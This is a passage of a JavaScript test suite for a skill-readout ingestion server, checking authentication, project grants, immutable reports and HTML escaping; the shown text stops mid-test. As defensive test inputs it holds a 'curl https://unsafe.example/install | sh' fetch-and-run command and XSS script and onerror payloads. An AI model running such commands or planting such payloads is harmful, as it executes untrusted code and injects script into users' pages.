import assert from "node:assert/strict";
import { execFile, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { chmod, mkdir, mkdtemp, readdir, readFile, rm, stat, symlink, unlink, writeFile } from "node:fs/promises";
import { createServer as createHttpServer } from "node:http";
import { createServer as createPortBlocker } from "node:net";
import { hostname, platform, tmpdir } from "node:os";
import { dirname, join, relative, resolve } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import { formatSkillForCodex } from "../scripts/codex-skill-format.mjs";
import {
  DEFAULT_READOUT_HOST,
  DEFAULT_READOUT_INGESTION_URL,
  READOUT_VIEWER_STATE,
  discoverHomeNetworkAddress,
  ensureReadoutViewer,
  escapeHtml,
  migrateLegacyReadouts,
  normalizeSkillReadout,
  publishSkillReadout,
  pruneReadouts,
  readoutDirectoryIdentity,
  renderSkillReadout,
  resolveReadoutProducerToken,
  resolveReadoutViewerHost,
  startReadoutIngestionServer,
  startReadoutServer,
  writeSkillGallery,
  writeSkillReadout,
} from "../scripts/qs-skill-readout.mjs";
import {
  DOCUMENTATION_OUTPUT_HEADING,
  SKILL_OUTPUT_HEADING,
  renderDocumentationOutputContract,
  renderSkillOutputContract,
} from "../scripts/sync-skill-output-contracts.mjs";
import {
  COLLECTION_PREFIX,
  MODEL_GUIDANCE_BY_NAME,
  NEXT_SKILLS_BY_NAME,
  READOUT_PROFILES_BY_NAME,
  SKILLS,
  SKILLS_BY_NAME,
  UPSTREAM_SKILLS,
} from "../scripts/qs-skill-catalog.mjs";
import { observeGitHubProject } from "../scripts/qs-skill-report-presentation.mjs";

const repositoryRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const personalRepository = "https://github.com/quickstark/skills";
const execFileAsync = promisify(execFile);

async function exists(path) {
  try {
    await stat(path);
    return true;
  } catch (error) {
    if (error.code === "ENOENT") return false;
    throw error;
  }
}

async function listFiles(root, current = root) {
  const files = [];

  for (const entry of await readdir(current, { withFileTypes: true })) {
    const path = join(current, entry.name);
    if (entry.isDirectory()) {
      files.push(...(await listFiles(root, path)));
    } else if (entry.isFile()) {
      files.push(relative(root, path));
    } else {
      assert.fail(`Packaged skill contains a non-regular entry: ${path}`);
    }
  }

  return files.sort();
}

async function temporaryReadoutDirectory(context) {
  const directory = await mkdtemp(join(tmpdir(), "quickstark-readout-test-"));

  context.after(async () => {
    await rm(directory, { recursive: true, force: true });
  });

  return directory;
}

async function temporaryGitProject(context, remote) {
  const directory = await temporaryReadoutDirectory(context);

  await execFileAsync("git", ["init", "--quiet", directory]);

  if (remote !== undefined) {
    await execFileAsync("git", ["-C", directory, "remote", "add", "origin", remote]);
  }

  return directory;
}

function explicitProject(repository) {
  return {
    host: "github.com",
    owner: "quickstark",
    repository,
    key: `github.com/quickstark/${repository}`,
    label: `quickstark/${repository}`,
    source: "explicit",
  };
}

function verifiedGithubProvenance() {
  return {
    pullRequests: [
      {
        number: 42,
        title: "Publish verified skill readouts",
        state: "merged",
        url: "https://github.com/quickstark/skills/pull/42",
      },
    ],
    closedIssues: [
      {
        number: 17,
        title: "Make release evidence visible",
        state: "closed",
        closedByRelease: true,
        url: "https://github.com/quickstark/skills/issues/17",
      },
    ],
    release: {
      version: "v2.3.1",
      url: "https://github.com/quickstark/skills/releases/tag/v2.3.1",
    },
    commit: {
      sha: "0123456789abcdef0123456789abcdef01234567",
      published: true,
      url: "https://github.com/quickstark/skills/commit/0123456789abcdef0123456789abcdef01234567",
    },
  };
}

async function temporaryProjectGallery(context, options = {}) {
  const directory = await temporaryReadoutDirectory(context);
  const entries = [
    {
      skill: "qs-plan-research",
      outcome: "Research the skill-hosting architecture.",
      generatedAt: "2026-07-24T10:00:00.000Z",
      projectIdentity: explicitProject("skills"),
    },
    {
      skill: "qs-code-build",
      outcome: "Build the marketplace search experience.",
      generatedAt: "2026-07-25T12:00:00.000Z",
      projectIdentity: explicitProject("marketplace"),
    },
    {
      skill: "qs-design-prototype",
      status: "Preview",
      skillsUsed: [],
      outcome: "Catalog preview only; no actual design work occurred.",
      generatedAt: "2026-07-25T13:00:00.000Z",
      projectIdentity: explicitProject("skills"),
    },
  ];
  const reports = [];

  for (const entry of entries) {
    reports.push(await writeSkillReadout(entry, { directory, layout: "project" }));
  }

  const viewer = await startReadoutServer({ directory, port: 0, ...options });

  context.after(async () => {
    if (!viewer.server.listening) return;

    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  return { directory, viewer, reports };
}

function nativeIngestionEnvelope(overrides = {}) {
  return {
    version: 1,
    producer: "codex-laptop",
    harness: { name: "codex", version: "1.0.0" },
    collection: "quickstark/qs-skills",
    project: "https://github.com/quickstark/skills.git",
    runId: "a6ba1c2b-d2a5-4962-b591-7d2bec883021",
    generatedAt: "2026-07-26T12:00:00.000Z",
    skill: "qs-code-build",
    status: "Completed",
    outcome: "Publish an authenticated native skill readout.",
    findings: [{ title: "Authenticated ingestion", detail: "The real report is available." }],
    nextSkills: [],
    ...overrides,
  };
}

async function temporaryReadoutIngestion(context, options = {}) {
  const directory = await temporaryReadoutDirectory(context);
  const viewer = await startReadoutServer({
    directory,
    port: 0,
    publicationMode: "hosted",
    allowedProjects: ["github.com/quickstark/skills"],
    ...options.viewer,
  });
  const ingestion = await startReadoutIngestionServer({
    directory,
    port: 0,
    baseUrl: viewer.url,
    allowedProjects: ["github.com/quickstark/skills"],
    producers: [{
      id: "codex-laptop",
      token: "test-only-codex-laptop-credential-1234567890",
      projects: ["github.com/quickstark/skills"],
    }],
    ...options.ingestion,
  });

  for (const running of [ingestion, viewer]) {
    context.after(async () => {
      if (!running.server.listening) return;

      await new Promise((done, fail) => {
        running.server.close((error) => error ? fail(error) : done());
      });
    });
  }

  return { directory, viewer, ingestion };
}

function redirectCanonicalHostedIngestion(ingestion) {
  const shim = [
    "const originalFetch = globalThis.fetch;",
    `const ingestion = ${JSON.stringify(ingestion.url)};`,
    "globalThis.fetch = (resource, options) => {",
    "  const target = new URL(resource instanceof Request ? resource.url : String(resource));",
    "  if (target.href === 'https://reports.quickstark.com/api/v1/readouts') {",
    "    return originalFetch(new URL(target.pathname, ingestion), options);",
    "  }",
    "  return originalFetch(resource, options);",
    "};",
  ].join("\n");

  return `data:text/javascript,${encodeURIComponent(shim)}`;
}

function submitIngestion(ingestion, envelope, {
  token = "test-only-codex-laptop-credential-1234567890",
  headers = {},
  method = "POST",
  path = "api/v1/readouts",
  body,
} = {}) {
  return fetch(new URL(path, ingestion.url), {
    method,
    headers: {
      "Content-Type": "application/json",
      ...(token === null ? {} : { Authorization: `Bearer ${token}` }),
      ...headers,
    },
    ...(method === "GET" || method === "HEAD" ? {} : {
      body: body === undefined ? JSON.stringify(envelope) : body,
    }),
  });
}

test("an authenticated producer can ingest and retrieve an immutable native skill readout", async (context) => {
  const { viewer, ingestion } = await temporaryReadoutIngestion(context);
  const response = await submitIngestion(ingestion, nativeIngestionEnvelope());

  assert.equal(response.status, 201);

  const accepted = await response.json();
  assert.equal(accepted.status, "created");
  assert.equal(accepted.project, "github.com/quickstark/skills");
  assert.equal(accepted.skill, "qs-code-build");
  assert.equal(accepted.reportId, "a6ba1c2b-d2a5-4962-b591-7d2bec883021");
  assert.ok(accepted.url.startsWith(viewer.url));

  const report = await fetch(accepted.url);
  assert.equal(report.status, 200);

  const html = await report.text();
  assert.match(html, /Publish an authenticated native skill readout/);
  assert.match(html, /Authenticated ingestion/);

  const gallery = await fetch(viewer.url);
  assert.equal(gallery.status, 200);
  assert.match(await gallery.text(), /Publish an authenticated native skill readout/);

  const viewerPost = await fetch(viewer.url, { method: "POST" });
  assert.equal(viewerPost.status, 405);
  assert.equal(viewerPost.headers.get("allow"), "GET, HEAD");
});

test("authenticated hosted readouts preserve actual user-run commands and key code", async (context) => {
  const { viewer, ingestion } = await temporaryReadoutIngestion(context);
  const command = "codex plugin add qs-skills@quickstark --json";
  const code = '{\n  "name": "qs-skills",\n  "version": "2.6.0"\n}';
  const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
    commands: [{
      title: "Install the published plugin",
      command,
      detail: "Run this command in your terminal to install the published update.",
    }],
    keyCode: [{
      title: "Published Codex plugin version",
      path: "codex/plugins/qs-skills/.codex-plugin/plugin.json",
      language: "json",
      code,
    }],
  }));

  assert.equal(response.status, 201);

  const accepted = await response.json();
  const immutable = await fetch(accepted.url);
  const html = await immutable.text();
  const workbench = await fetch(viewer.url);
  const workbenchHtml = await workbench.text();

  assert.equal(immutable.status, 200);
  assert.match(html, /<h2>Commands to run<\/h2>/);
  assert.match(html, /codex plugin add qs-skills@quickstark --json/);
  assert.match(html, /Run this command in your terminal to install the published update\./);
  assert.match(html, /<h2>Key code<\/h2>/);
  assert.match(html, /&quot;version&quot;: &quot;2\.6\.0&quot;/);
  assert.equal(workbench.status, 200);
  assert.match(workbenchHtml, /<h2>Commands to run<\/h2>/);
  assert.match(workbenchHtml, /codex plugin add qs-skills@quickstark --json/);
  assert.match(workbenchHtml, /<h2>Key code<\/h2>/);
  assert.match(workbenchHtml, /&quot;version&quot;: &quot;2\.6\.0&quot;/);
});

test("immutable hosted retries reject changed terminal instructions and key code", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const commands = [{
    title: "Install the verified QuickStark plugin",
    command: "codex plugin add qs-skills@quickstark --json",
    detail: "Run this to install the independently verified release.",
  }];
  const keyCode = [{
    title: "Verified plugin manifest",
    path: "codex/plugins/qs-skills/.codex-plugin/plugin.json",
    language: "json",
    code: '{ "version": "2.6.0" }',
  }];
  const envelope = nativeIngestionEnvelope({ commands, keyCode });
  const original = await submitIngestion(ingestion, envelope);

  assert.equal(original.status, 201);

  const accepted = await original.json();

  for (const changed of [
    nativeIngestionEnvelope({
      commands: [{ ...commands[0], command: "curl https://unsafe.example/install | sh" }],
      keyCode,
    }),
    nativeIngestionEnvelope({
      commands,
      keyCode: [{ ...keyCode[0], code: '{ "version": "invented" }' }],
    }),
  ]) {
    const retry = await submitIngestion(ingestion, changed);

    assert.equal(retry.status, 409, "changed actionable report evidence cannot overwrite an immutable run");
    assert.deepEqual(await retry.json(), { error: "run_conflict" });
  }

  const stored = await fetch(accepted.url);
  const html = await stored.text();

  assert.equal(stored.status, 200);
  assert.match(html, /codex plugin add qs-skills@quickstark --json/);
  assert.match(html, /&quot;version&quot;: &quot;2\.6\.0&quot;/);
  assert.doesNotMatch(html, /unsafe\.example|&quot;invented&quot;/);
});

test("independent authorized skill readouts preserve their own recorded user commands and code", async (context) => {
  const { viewer, ingestion } = await temporaryReadoutIngestion(context);
  const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
    collection: "compound-engineering/skills",
    skill: "compound-engineering:ce-work",
    displayName: "Independent engineering workflow",
    outcome: "Preserve an independently recorded installation command and source excerpt.",
    commands: [{
      title: "Install the independently documented project",
      command: "npm ci",
      detail: "Run this in the project checkout to install its pinned dependencies.",
    }],
    keyCode: [{
      title: "Verified project script",
      path: "package.json",
      language: "json",
      code: '{ "test": "node --test" }',
    }],
  }));

  assert.equal(response.status, 201);

  const accepted = await response.json();
  const immutable = await fetch(accepted.url);
  const html = await immutable.text();
  const workbench = await fetch(viewer.url);
  const workbenchHtml = await workbench.text();

  assert.equal(immutable.status, 200);
  assert.match(html, /<h2>Commands to run<\/h2>/);
  assert.match(html, /<code class="language-bash">npm ci<\/code>/);
  assert.match(html, /Run this in the project checkout to install its pinned dependencies\./);
  assert.match(html, /<h2>Key code<\/h2>/);
  assert.match(html, /&quot;test&quot;: &quot;node --test&quot;/);
  assert.equal(workbench.status, 200);
  assert.match(workbenchHtml, /compound-engineering:ce-work/);
  assert.match(workbenchHtml, /<h2>Commands to run<\/h2>/);
  assert.match(workbenchHtml, /<code class="language-bash">npm ci<\/code>/);
  assert.match(workbenchHtml, /<h2>Key code<\/h2>/);
  assert.match(workbenchHtml, /&quot;test&quot;: &quot;node --test&quot;/);
});

test("identical skill-readout submissions return the existing immutable report", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const envelope = nativeIngestionEnvelope();
  const first = await submitIngestion(ingestion, envelope);
  const initial = await first.json();
  const second = await submitIngestion(ingestion, envelope);

  assert.equal(first.status, 201);
  assert.equal(second.status, 200);

  const retry = await second.json();
  assert.equal(retry.status, "existing");
  assert.equal(retry.url, initial.url);
  assert.equal(retry.reportId, initial.reportId);

  const report = await fetch(initial.url);
  assert.equal(report.status, 200);
  assert.match(await report.text(), /Publish an authenticated native skill readout/);
});

test("a conflicting skill-readout retry never replaces the original report", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const original = await submitIngestion(ingestion, nativeIngestionEnvelope());
  const accepted = await original.json();
  const changed = await submitIngestion(ingestion, nativeIngestionEnvelope({
    outcome: "Attempt to replace the original immutable skill report.",
  }));

  assert.equal(original.status, 201);
  assert.equal(changed.status, 409);
  assert.deepEqual(await changed.json(), { error: "run_conflict" });

  const html = await (await fetch(accepted.url)).text();
  assert.match(html, /Publish an authenticated native skill readout/);
  assert.doesNotMatch(html, /Attempt to replace/);
});

test("concurrent identical skill-readout submissions create only one report", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const envelope = nativeIngestionEnvelope();
  const responses = await Promise.all(Array.from({ length: 6 }, () => submitIngestion(ingestion, envelope)));
  const results = await Promise.all(responses.map((response) => response.json()));

  assert.equal(responses.filter((response) => response.status === 201).length, 1);
  assert.equal(responses.filter((response) => response.status === 200).length, 5);
  assert.equal(new Set(results.map((result) => result.url)).size, 1);

  const html = await (await fetch(viewer.url)).text();
  assert.equal((html.match(/Publish an authenticated native skill readout/g) ?? []).length, 1);
});

test("readout ingestion rejects missing, invalid, and mismatched producer credentials", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);

  for (const options of [
    { token: null },
    { token: "an-invalid-producer-credential-1234567890" },
  ]) {
    const denied = await submitIngestion(ingestion, nativeIngestionEnvelope(), options);
    assert.equal(denied.status, 401);
    assert.deepEqual(await denied.json(), { error: "unauthorized" });
  }

  const mismatched = await submitIngestion(ingestion, nativeIngestionEnvelope({ producer: "different-laptop" }));
  assert.equal(mismatched.status, 403);
  assert.deepEqual(await mismatched.json(), { error: "publication_not_authorized" });

  const gallery = await fetch(viewer.url);
  assert.doesNotMatch(await gallery.text(), /Publish an authenticated native skill readout/);
});

test("an authenticated readout producer cannot publish an unapproved project", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const denied = await submitIngestion(ingestion, nativeIngestionEnvelope({
    project: "https://github.com/quickstark/marketplace.git",
  }));

  assert.equal(denied.status, 403);
  const body = await denied.text();
  assert.doesNotMatch(body, /marketplace/);
  assert.deepEqual(JSON.parse(body), { error: "publication_not_authorized" });
  assert.doesNotMatch(await (await fetch(viewer.url)).text(), /marketplace/);
});

test("readout ingestion normalizes equivalent safe SSH and HTTPS project origins", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const accepted = await submitIngestion(ingestion, nativeIngestionEnvelope({
    project: "git@github.com:quickstark/skills.git",
    runId: "d06c43ab-f919-48ad-8d4c-7a4a56d92c15",
    outcome: "Submit an authorized skill using its SSH Git origin.",
  }));

  assert.equal(accepted.status, 201);
  assert.equal((await accepted.json()).project, "github.com/quickstark/skills");
  assert.match(await (await fetch(viewer.url)).text(), /Submit an authorized skill using its SSH Git origin/);
});

test("readout ingestion rejects unsafe origins without disclosing credentials", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);

  for (const project of [
    "https://token@github.com/quickstark/skills.git",
    "https://github.com/quickstark/../skills.git",
    "/tmp/private-checkout",
    "https://github.com/quickstark/skills.git?token=private",
  ]) {
    const response = await submitIngestion(ingestion, nativeIngestionEnvelope({ project }));
    const body = await response.text();
    assert.equal(response.status, 422, project);
    assert.doesNotMatch(body, /token|private|checkout/i);
    assert.deepEqual(JSON.parse(body), { error: "invalid_project" });
  }
});

test("readout ingestion permits only its exact authenticated producer route", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);

  for (const method of ["GET", "PUT", "PATCH", "DELETE"]) {
    const response = await submitIngestion(ingestion, nativeIngestionEnvelope(), { method });
    assert.equal(response.status, 405, method);
    assert.equal(response.headers.get("allow"), "POST");
  }

  const other = await submitIngestion(ingestion, nativeIngestionEnvelope(), { path: "api/v1/readouts/extra" });
  assert.equal(other.status, 404);

  const health = await fetch(new URL("__quickstark_ingestion_health", ingestion.url));
  assert.equal(health.status, 200);
  const metadata = await health.json();
  assert.equal(metadata.service, "quickstark-skill-readout-ingestion");
  assert.equal(typeof metadata.directory, "string");
});

test("readout ingestion rejects malformed, unsupported, and oversized submissions", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context, {
    ingestion: { maxBytes: 2048 },
  });

  const malformed = await submitIngestion(ingestion, nativeIngestionEnvelope(), { body: "{" });
  assert.equal(malformed.status, 400);
  assert.deepEqual(await malformed.json(), { error: "invalid_json" });

  const wrongType = await submitIngestion(ingestion, nativeIngestionEnvelope(), {
    headers: { "Content-Type": "text/html" },
  });
  assert.equal(wrongType.status, 415);

  const unsupported = await submitIngestion(ingestion, nativeIngestionEnvelope({ version: 72 }));
  assert.equal(unsupported.status, 422);
  assert.deepEqual(await unsupported.json(), { error: "unsupported_readout_version" });

  const oversized = await submitIngestion(ingestion, nativeIngestionEnvelope({ outcome: "x".repeat(4096) }));
  assert.equal(oversized.status, 413);
  assert.deepEqual(await oversized.json(), { error: "payload_too_large" });

  const invalidRun = await submitIngestion(ingestion, nativeIngestionEnvelope({ runId: "../../unsafe" }));
  assert.equal(invalidRun.status, 422);
});

test("readout ingestion requires actual UTC run timestamps and observed completion status", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);

  for (const invalid of [
    { generatedAt: undefined },
    { generatedAt: null },
    { generatedAt: "2026-07-26" },
    { generatedAt: "2026-07-26T12:00:00+00:00" },
    { generatedAt: "2026-02-30T12:00:00.000Z" },
    { generatedAt: "not-an-observed-timestamp" },
    { status: undefined },
    { status: null },
    { status: "Preview" },
    { status: "Invented completion" },
  ]) {
    const response = await submitIngestion(ingestion, nativeIngestionEnvelope(invalid));

    assert.equal(response.status, 422, JSON.stringify(invalid));
    assert.deepEqual(await response.json(), { error: "invalid_readout" });
  }
});

test("readout ingestion fails closed without explicit producer and project grants", async (context) => {
  const directory = await temporaryReadoutDirectory(context);

  await assert.rejects(startReadoutIngestionServer({
    directory,
    port: 0,
    baseUrl: "http://127.0.0.1:4173/",
    allowedProjects: ["github.com/quickstark/skills"],
    producers: [],
  }), /explicitly authorized producer/i);

  await assert.rejects(startReadoutIngestionServer({
    directory,
    port: 0,
    baseUrl: "http://127.0.0.1:4173/",
    allowedProjects: [],
    producers: [{
      id: "codex-laptop",
      token: "test-only-codex-laptop-credential-1234567890",
      projects: ["github.com/quickstark/skills"],
    }],
  }), /explicitly approved published project/i);

  await assert.rejects(startReadoutIngestionServer({
    directory,
    port: 0,
    baseUrl: "http://127.0.0.1:4173/",
    allowedProjects: ["github.com/quickstark/skills"],
    producers: [{ id: "codex-laptop", token: "short", projects: [] }],
  }), /at least 24 characters/i);
});

test("readout ingestion safely renders untrusted producer findings", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const accepted = await submitIngestion(ingestion, nativeIngestionEnvelope({
    findings: [{
      title: '<script>alert("unsafe")</script>',
      detail: '<img src=x onerror="alert(1)">',
    }],
  }));

  assert.equal(accepted.status, 201);

  const report = await fetch((await accepted.json()).url);
  const html = await report.text();
  assert.doesNotMatch(html, /<script>|<img src=x/i);
  assert.match(html, /&lt;script&gt;/);
  assert.match(html, /&lt;img src=x/);
  assert.match(report.headers.get("content-security-policy"), /default-src 'none'/);
  assert.equal(accepted.headers.get("access-control-allow-origin"), null);
});

test("an authorized external skill appears truthfully throughout the project gallery", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const envelope = nativeIngestionEnvelope({
    harness: { name: "claude-code", version: "1.0.0" },
    collection: "independent/engineering-skills",
    skill: "investigate-architecture",
    runId: "12b45dc1-d41e-44aa-b792-6e7dc3c43f10",
    outcome: "Trace a genuine independently maintained architecture skill.",
    findings: [{ title: "Independent architecture observation", detail: "Observed at the external seam." }],
  });
  const response = await submitIngestion(ingestion, envelope);

  assert.equal(response.status, 201);

  const accepted = await response.json();
  assert.equal(accepted.skill, "investigate-architecture");

  const report = await fetch(accepted.url);
  assert.equal(report.status, 200);

  const html = await report.text();
  assert.match(html, /investigate-architecture/);
  assert.match(html, /claude-code/);
  assert.match(html, /independent\/engineering-skills/);
  assert.match(html, /Independent architecture observation/);
  assert.doesNotMatch(html, /promoted QuickStark skill/i);

  for (const suffix of ["", "?view=explorer", "?view=activity"]) {
    const page = await fetch(new URL(suffix || ".", viewer.url));
    assert.equal(page.status, 200);
    assert.match(await page.text(), /investigate-architecture|Trace a genuine independently maintained architecture skill/);
  }

  assert.throws(
    () => normalizeSkillReadout({ skill: "investigate-architecture", outcome: "Do not bypass the native catalog." }),
    /not a promoted QuickStark skill/,
  );
});

test("an authorized plugin-namespaced external skill remains visible throughout the project library", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const nextPrompt = "Use /compound-engineering:ce-work to apply the architecture review's observed findings without claiming the implementation already ran.";
  const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
    harness: { name: "codex-desktop", version: "1.0.0" },
    collection: "compound-engineering/skills",
    skill: "compound-engineering:ce-code-review",
    runId: "ef26ecf9-1d2f-426b-a04f-605a83d40af1",
    outcome: "Record an actual namespaced skill from an independent Codex plugin.",
    nextSkills: [{
      name: "compound-engineering:ce-work",
      reason: "Apply the verified review.",
      prompt: nextPrompt,
      model: "gpt-5.6-sol",
      thinking: "high",
      modelReason: "The recorded architecture findings justify a careful implementation pass.",
    }],
  }));

  assert.equal(response.status, 201);

  const accepted = await response.json();
  assert.equal(accepted.skill, "compound-engineering:ce-code-review");
  assert.match(accepted.url, /qs-external-compound-engineering-ce-code-review--/);

  const html = await (await fetch(accepted.url)).text();
  assert.match(html, /compound-engineering:ce-code-review/);
  assert.match(html, /compound-engineering:ce-work/);
  assert.match(html, /codex-desktop/);
  assert.match(html, /Producer-reported next prompts/);
  assert.ok(html.includes(nextPrompt.replaceAll("'", "&#39;")));
  assert.match(html, /<pre class="next-prompt-block"><code>/);
  assert.match(html, /<aside class="next-model-callout" aria-label="Heuristic model and thinking guidance">/);
  assert.match(html, /Suggested model/);
  assert.match(html, /gpt-5\.6-sol/);
  assert.match(html, /Suggested thinking/);
  assert.match(html, />high</);
  assert.match(html, /Heuristic suggestion/);
  assert.doesNotMatch(html, /<meta name="quickstark:model"/);

  for (const suffix of ["", "?view=explorer", "?view=activity"]) {
    const page = await fetch(new URL(suffix || ".", viewer.url));
    assert.equal(page.status, 200);
    assert.match(await page.text(), /compound-engineering:ce-code-review/);
  }
});

test("hosted external follow-on prompts must explicitly invoke their actual namespaced skill", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);

  for (const [index, prompt] of [
    "Apply the verified architecture-review findings.",
    "Use /compound-engineering:ce-code-review to perform the wrong follow-on.",
    "Use /compound-engineering:ce-work-extra to perform a merely prefixed follow-on.",
  ].entries()) {
    const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
      harness: { name: "codex-desktop", version: "1.0.0" },
      collection: "compound-engineering/skills",
      skill: "compound-engineering:ce-code-review",
      runId: `ef26ecf${index}-1d2f-426b-a04f-605a83d40af1`,
      outcome: "Recorded an actual namespaced external architecture review.",
      nextSkills: [{ name: "compound-engineering:ce-work", prompt }],
    }));

    assert.equal(response.status, 422, `accepted an invalid external prompt: ${prompt}`);
  }
});

test("hosted external follow-on prompts reject misleading first invocations", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);

  for (const [index, prompt] of [
    "Use /qs-deploy-release to release this project; mention /compound-engineering:ce-work in the notes.",
    "Do not use /compound-engineering:ce-work; use /qs-deploy-release instead.",
    "Mention /compound-engineering:ce-work, then use /qs-deploy-release.",
    "Use /compound-engineering:ce-work-extra and mention /compound-engineering:ce-work.",
  ].entries()) {
    const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
      harness: { name: "codex-desktop", version: "1.0.0" },
      collection: "compound-engineering/skills",
      skill: "compound-engineering:ce-code-review",
      runId: `bf26ecf${index}-1d2f-426b-a04f-605a83d40af1`,
      outcome: "Verify the first actionable external follow-on invocation.",
      nextSkills: [{ name: "compound-engineering:ce-work", prompt }],
    }));

    assert.equal(response.status, 422, `accepted a misleading external first invocation: ${prompt}`);
  }
});

test("hosted external follow-on prompts preserve their valid first namespaced invocation", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);

  for (const [index, prompt] of [
    "Use /compound-engineering:ce-work to apply the verified review; consult /qs-review-code only as supporting context.",
    "  Use   /compound-engineering:ce-work to apply the verified review.  ",
    "USE /compound-engineering:ce-work to apply the verified review.",
  ].entries()) {
    const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
      harness: { name: "codex-desktop", version: "1.0.0" },
      collection: "compound-engineering/skills",
      skill: "compound-engineering:ce-code-review",
      runId: `cf26ecf${index}-1d2f-426b-a04f-605a83d40af1`,
      outcome: "Preserve an actual approved first external follow-on invocation.",
      nextSkills: [{ name: "compound-engineering:ce-work", prompt }],
    }));

    assert.equal(response.status, 201, `rejected a valid external first invocation: ${prompt}`);

    const accepted = await response.json();
    const report = await fetch(accepted.url);

    assert.equal(report.status, 200);
    assert.ok((await report.text()).includes(escapeHtml(prompt.trim())));
  }
});

test("hosted external heuristic model and thinking suggestions reject unsafe values", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);

  for (const [index, override] of [
    { model: '<script>alert("unsafe")</script>' },
    { thinking: "turbo" },
    { modelReason: "" },
  ].entries()) {
    const response = await submitIngestion(ingestion, nativeIngestionEnvelope({
      harness: { name: "codex-desktop", version: "1.0.0" },
      collection: "compound-engineering/skills",
      skill: "compound-engineering:ce-code-review",
      runId: `af26ecf${index}-1d2f-426b-a04f-605a83d40af1`,
      outcome: "Recorded an actual namespaced external architecture review.",
      nextSkills: [{
        name: "compound-engineering:ce-work",
        prompt: "Use /compound-engineering:ce-work to apply the recorded review findings.",
        ...override,
      }],
    }));

    assert.equal(response.status, 422, `accepted unsafe model guidance: ${JSON.stringify(override)}`);
  }
});

test("a portable publisher sends a local native readout to the approved hosted project", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context);
  const result = await publishSkillReadout(nativeIngestionEnvelope(), {
    endpoint: new URL("api/v1/readouts", ingestion.url).href,
    token: "test-only-codex-laptop-credential-1234567890",
    allowedProjects: ["github.com/quickstark/skills"],
  });

  assert.equal(result.status, "published");
  assert.equal(result.created, true);
  assert.equal(result.project, "github.com/quickstark/skills");
  assert.ok(result.url.startsWith(viewer.url));
  assert.match(await (await fetch(result.url)).text(), /Publish an authenticated native skill readout/);
});

test("a portable publisher safely retries the same immutable skill run", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const options = {
    endpoint: new URL("api/v1/readouts", ingestion.url).href,
    token: "test-only-codex-laptop-credential-1234567890",
    allowedProjects: ["github.com/quickstark/skills"],
  };
  const first = await publishSkillReadout(nativeIngestionEnvelope(), options);
  const retry = await publishSkillReadout(nativeIngestionEnvelope(), options);

  assert.equal(first.created, true);
  assert.equal(retry.created, false);
  assert.equal(retry.url, first.url);
});

test("portable publication stays disabled without a private token or when explicitly denied", async () => {
  const disabled = await publishSkillReadout(nativeIngestionEnvelope());

  assert.deepEqual(disabled, { status: "local-only", reason: "publication_not_configured" });

  const unapproved = await publishSkillReadout(nativeIngestionEnvelope(), {
    endpoint: "https://reports.quickstark.com/api/v1/readouts",
    token: "test-only-codex-laptop-credential-1234567890",
    allowedProjects: [],
  });

  assert.deepEqual(unapproved, { status: "local-only", reason: "project_not_authorized" });
});

test("a portable publisher preserves local-only reporting when hosted ingestion is unavailable", async () => {
  const result = await publishSkillReadout(nativeIngestionEnvelope(), {
    endpoint: "http://127.0.0.1:1/api/v1/readouts",
    token: "test-only-codex-laptop-credential-1234567890",
    allowedProjects: ["github.com/quickstark/skills"],
    timeout: 250,
  });

  assert.deepEqual(result, { status: "local-only", reason: "publication_unavailable" });
});

test("the portable publisher supports independently named cross-harness skills", async (context) => {
  const { ingestion } = await temporaryReadoutIngestion(context);
  const result = await publishSkillReadout(nativeIngestionEnvelope({
    harness: { name: "claude-code", version: "1.0.0" },
    collection: "independent/engineering-skills",
    skill: "review-deployment",
    runId: "c123de17-445f-4581-a4bf-8eef204d6543",
    outcome: "Publish an independently maintained skill from another harness.",
  }), {
    endpoint: new URL("api/v1/readouts", ingestion.url).href,
    token: "test-only-codex-laptop-credential-1234567890",
    allowedProjects: ["github.com/quickstark/skills"],
  });

  assert.equal(result.status, "published");
  const html = await (await fetch(result.url)).text();
  assert.match(html, /review-deployment/);
  assert.match(html, /claude-code/);
  assert.match(html, /independent\/engineering-skills/);
});

test("independent report producers cannot use each other's project grants", async (context) => {
  const { ingestion, viewer } = await temporaryReadoutIngestion(context, {
    viewer: { allowedProjects: ["github.com/quickstark/skills", "github.com/quickstark/marketplace"] },
    ingestion: {
      allowedProjects: ["github.com/quickstark/skills", "github.com/quickstark/marketplace"],
      producers: [
        {
          id: "codex-laptop",
          token: "test-only-codex-laptop-credential-1234567890",
          projects: ["github.com/quickstark/skills"],
        },
        {
          id: "marketplace-laptop",
          token: "test-only-marketplace-producer-credential-4567890",
          projects: ["github.com/quickstark/marketplace"],
        },
      ],
    },
  });

  const forbidden = await submitIngestion(ingestion, nativeIngestionEnvelope({
    project: "https://github.com/quickstark/marketplace.git",
  }));

